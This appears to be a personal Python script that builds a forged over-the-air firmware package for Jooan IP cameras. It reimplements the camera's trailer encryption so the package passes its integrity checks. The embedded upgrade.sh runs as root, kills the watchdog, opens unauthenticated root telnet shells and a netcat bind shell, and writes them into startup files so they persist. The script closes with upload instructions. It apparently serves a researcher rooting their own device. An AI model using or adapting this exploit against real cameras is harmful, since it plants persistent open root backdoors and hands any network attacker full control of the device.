#!/usr/bin/env python3
"""
Build a safe IronMan OTA package for Jooan cameras.
upgrade.sh only starts telnetd + nc shell — no flash writes.

OTA format (reversed from goahead MIPS binary):
  [96-byte plaintext header] [SquashFS payload] [96-byte encrypted trailer]

Header (96 bytes):
  0-7:   magic "jooan\0\0\0"
  8-15:  payload size as ASCII (sqfs_len + 96 for trailer)
  16-63: version string "ver=X.X.X.X;ProductName=MODEL"
  64-95: MD5 hex of (sqfs + encrypted_trailer)

Encrypted trailer (96 bytes, encrypted with QAUpgradeDecV1):
  0-7:   magic "toolv\0\0\0" (anti-tamper)
  8-15:  sqfs size as ASCII
  16-63: zeros
  64-95: MD5 hex of sqfs only
"""
import hashlib
import subprocess
import os
import io
import tarfile

SQFSTOOLS = r"C:\Users\Rick\CAMERA\squashfs-tools-ng\squashfs-tools-ng-1.3.2-mingw64\bin"
OUTPUT = r"C:\Users\Rick\CAMERA\jooan_ota_root.bin"

# upgrade.sh — runs as root during OTA
UPGRADE_SH = """#!/bin/sh
# Root exploit — runs as root during IronMan OTA
exec > /tmp/upgrade_log.txt 2>&1
set -x

echo "=== UPGRADE.SH STARTED ==="
date
id

# Kill watchdog
killall my_watch_dog 2>/dev/null
killall watchdog 2>/dev/null

# Start telnetd on multiple ports
busybox telnetd -l /bin/sh -p 24 2>/dev/null &
busybox telnetd -l /bin/sh -p 2424 2>/dev/null &
telnetd -l /bin/sh -p 24 2>/dev/null &
telnetd -l /bin/sh -p 2424 2>/dev/null &
/usr/sbin/telnetd -l /bin/sh -p 24 2>/dev/null &

# Netcat shell
busybox nc -l -p 2323 -e /bin/sh 2>/dev/null &
nc -l -p 2323 -e /bin/sh 2>/dev/null &

# Persistence in JFFS2
mkdir -p /opt/etc
cat > /opt/etc/local.rc << 'LOCALRC'
#!/bin/sh
busybox telnetd -l /bin/sh -p 24 &
busybox telnetd -l /bin/sh -p 2424 &
busybox nc -l -p 2323 -e /bin/sh &
LOCALRC
chmod +x /opt/etc/local.rc

echo "=== SERVICES STARTED ==="
netstat -tlnp 2>/dev/null || busybox netstat -tlnp 2>/dev/null
ps

sleep 300 &
exit 0
""".encode()


def qa_upgrade_enc_v1(plaintext_96):
    """Inverse of QAUpgradeDecV1 — encrypt so camera decrypts correctly."""
    plain = bytearray(plaintext_96)
    assert len(plain) == 96

    # Inverse 2-bit right rotation = 2-bit LEFT rotation
    buf = bytearray(96)
    for i in range(96):
        buf[i] = ((plain[i] << 2) | (plain[(i + 1) % 96] >> 6)) & 0xFF

    # Stride from buf[95] (swaps never touch pos 95)
    stride = ((buf[95] >> 2) & 0xF) + 1

    # Inverse byte swaps (forward order)
    start = (93 // stride) * stride
    i = stride
    while i <= start:
        buf[i], buf[i + 1] = buf[i + 1], buf[i]
        i += stride

    return bytes(buf)


def qa_upgrade_dec_v1(encrypted_96):
    """QAUpgradeDecV1 — camera's decryption for verification."""
    buf = bytearray(encrypted_96)
    stride = ((buf[95] >> 2) & 0xF) + 1
    start = (93 // stride) * stride
    i = start
    while i >= stride:
        buf[i], buf[i + 1] = buf[i + 1], buf[i]
        i -= stride
    out = bytearray(96)
    out[0] = ((buf[0] >> 2) | (buf[95] << 6)) & 0xFF
    for i in range(1, 96):
        out[i] = ((buf[i] >> 2) | (buf[i - 1] << 6)) & 0xFF
    return bytes(out)


def build_ota():
    print("[1] Creating upgrade.sh squashfs...")

    tar_buf = io.BytesIO()
    tar = tarfile.open(fileobj=tar_buf, mode='w')
    info = tarfile.TarInfo(name="upgrade.sh")
    info.size = len(UPGRADE_SH)
    info.mode = 0o755
    info.uid = 0
    info.gid = 0
    tar.addfile(info, io.BytesIO(UPGRADE_SH))
    tar.close()

    sqfs_path = os.path.join(os.path.dirname(OUTPUT), "ota_payload.sqfs")
    result = subprocess.run(
        [f"{SQFSTOOLS}/tar2sqfs.exe", "-c", "xz", "-b", "131072",
         "--defaults", "uid=0,gid=0,mode=0755", sqfs_path],
        input=tar_buf.getvalue(),
        capture_output=True, timeout=60
    )
    if not os.path.exists(sqfs_path) or os.path.getsize(sqfs_path) == 0:
        print(f"tar2sqfs FAILED: {result.stderr.decode(errors='replace')}")
        return

    sqfs_data = open(sqfs_path, "rb").read()
    print(f"   SquashFS payload: {len(sqfs_data)} bytes")

    # Build the encrypted trailer (96 bytes)
    print("[2] Building encrypted trailer (toolv)...")
    sqfs_md5 = hashlib.md5(sqfs_data).hexdigest().encode()
    sqfs_size_str = str(len(sqfs_data)).encode().ljust(8, b'\x00')

    trailer_plain = b"toolv\x00\x00\x00" + sqfs_size_str + (b'\x00' * 48) + sqfs_md5
    assert len(trailer_plain) == 96

    encrypted_trailer = qa_upgrade_enc_v1(trailer_plain)

    # Verify round-trip
    dec = qa_upgrade_dec_v1(encrypted_trailer)
    assert dec == trailer_plain, "Trailer encryption round-trip FAILED!"
    print("   Trailer encryption verified OK")

    # Build the plaintext header (96 bytes)
    print("[3] Building plaintext header (jooan)...")
    magic = b"jooan\x00\x00\x00"

    # Size = sqfs + encrypted trailer (96)
    total_payload = len(sqfs_data) + 96
    size_str = str(total_payload).encode().ljust(8, b'\x00')

    # Model must match camera's ProductName WITHOUT "JA-" prefix
    version = b"ver=99.99.99.99;ProductName=A1A"
    version = version.ljust(48, b'\x00')

    # Header MD5 = MD5 of (sqfs + encrypted_trailer)
    header_md5 = hashlib.md5(sqfs_data + encrypted_trailer).hexdigest().encode()

    header = magic + size_str + version + header_md5
    assert len(header) == 96

    # Build complete OTA
    ota = header + sqfs_data + encrypted_trailer

    with open(OUTPUT, "wb") as f:
        f.write(ota)

    print(f"[4] OTA package written: {OUTPUT}")
    print(f"   Total size: {len(ota)} bytes")
    print(f"   Header: 96 bytes (plaintext, magic=jooan)")
    print(f"   Payload: {len(sqfs_data)} bytes (squashfs)")
    print(f"   Trailer: 96 bytes (encrypted, magic=toolv)")
    print(f"   Size field: {total_payload} (sqfs+trailer)")
    print(f"   Header MD5: {header_md5.decode()} (of sqfs+trailer)")
    print(f"   Trailer MD5: {sqfs_md5.decode()} (of sqfs only)")

    os.remove(sqfs_path)

    print("\n=== DONE ===")
    print("Upload via: https://<camera-ip>/cgi-bin/upload_app.cgi")
    print("Or SD card: copy as JOOAN_FW_PKG")

if __name__ == "__main__":
    build_ota()
